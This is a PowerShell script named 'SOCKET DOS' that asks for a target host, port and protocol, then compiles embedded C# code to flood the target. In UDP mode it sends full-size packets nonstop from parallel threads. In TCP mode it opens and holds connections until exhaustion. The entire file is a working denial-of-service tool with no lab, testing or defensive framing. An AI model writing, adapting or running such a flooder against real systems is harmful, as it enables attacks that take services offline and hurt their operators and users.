Clear-Host

$Host.UI.RawUI.WindowTitle = "SOCKET DOS"

$worker_count = [Environment]::ProcessorCount
$udp_packet_size_bytes = 1472

$protocol = ""
while ($protocol -ne "TCP" -and $protocol -ne "UDP") {
    $answer = Read-Host -Prompt "Protocol - (T)CP or (U)DP?"
    if ($answer -match '^(T|TCP)$') { $protocol = "TCP" }
    if ($answer -match '^(U|UDP)$') { $protocol = "UDP" }
}

$host_address = Read-Host -Prompt "Target host"

$port_number = 0
while ($port_number -lt 1 -or $port_number -gt 65535) {
    $answer = Read-Host -Prompt "Target port (1-65535)"
    if ($answer -match '^\d+$') { $port_number = [int]$answer }
}

Write-Host "-------------------------------- SOCKET DOS $protocol --------------------------------" -ForegroundColor Yellow

# compiled flood engine so the send loop is not throttled by the PowerShell interpreter
$flood_source = @"
using System;
using System.Collections.Concurrent;
using System.Net.Sockets;
using System.Threading;

public static class SocketFlood
{
    public static volatile bool StopRequested;
    public static long UdpPacketsSent;
    public static long TcpConnectionsHeld;
    private static readonly ConcurrentBag<TcpClient> HeldClients = new ConcurrentBag<TcpClient>();

    public static void FloodUdp(string targetHost, int port, int packetSizeBytes, int workerCount)
    {
        var payload = new byte[packetSizeBytes];
        for (var workerNumber = 0; workerNumber < workerCount; workerNumber++)
        {
            var worker = new Thread(delegate()
            {
                using (var sender = new UdpClient())
                {
                    sender.Connect(targetHost, port);
                    while (!StopRequested)
                    {
                        sender.Send(payload, payload.Length);
                        Interlocked.Increment(ref UdpPacketsSent);
                    }
                }
            });
            worker.IsBackground = true;
            worker.Start();
        }
    }

    public static void FloodTcp(string targetHost, int port, int workerCount)
    {
        for (var workerNumber = 0; workerNumber < workerCount; workerNumber++)
        {
            var worker = new Thread(delegate()
            {
                while (!StopRequested)
                {
                    var client = new TcpClient();
                    try
                    {
                        client.Connect(targetHost, port);
                        HeldClients.Add(client);
                        Interlocked.Increment(ref TcpConnectionsHeld);
                    }
                    catch (Exception)
                    {
                        client.Close();
                        Thread.Sleep(20);
                    }
                }
            });
            worker.IsBackground = true;
            worker.Start();
        }
    }

    public static void ReleaseTcpConnections()
    {
        TcpClient releasedClient = null;
        while (HeldClients.TryTake(out releasedClient))
        {
            releasedClient.Close();
        }
    }
}
"@
Add-Type -TypeDefinition $flood_source -Language CSharp

if ($protocol -eq "TCP") {
    Write-Host "Flooding $host_address`:$port_number with TCP connections from $worker_count parallel workers (Ctrl+C to stop and release)..." -ForegroundColor Yellow
    [SocketFlood]::FloodTcp($host_address, $port_number, $worker_count)
    try {
        while ($true) {
            Start-Sleep -Seconds 1
            Write-Host ("Held open: {0:N0} connections" -f [SocketFlood]::TcpConnectionsHeld)
        }
    } finally {
        [SocketFlood]::StopRequested = $true
        Start-Sleep -Milliseconds 300
        [SocketFlood]::ReleaseTcpConnections()
        Write-Host "Connections released" -ForegroundColor Yellow
    }
} else {
    Write-Host "Flooding $host_address`:$port_number with UDP packets from $worker_count parallel workers (Ctrl+C to stop)..." -ForegroundColor Yellow
    [SocketFlood]::FloodUdp($host_address, $port_number, $udp_packet_size_bytes, $worker_count)
    try {
        while ($true) {
            Start-Sleep -Seconds 1
            Write-Host ("Sent: {0:N0} packets" -f [SocketFlood]::UdpPacketsSent)
        }
    } finally {
        [SocketFlood]::StopRequested = $true
    }
}
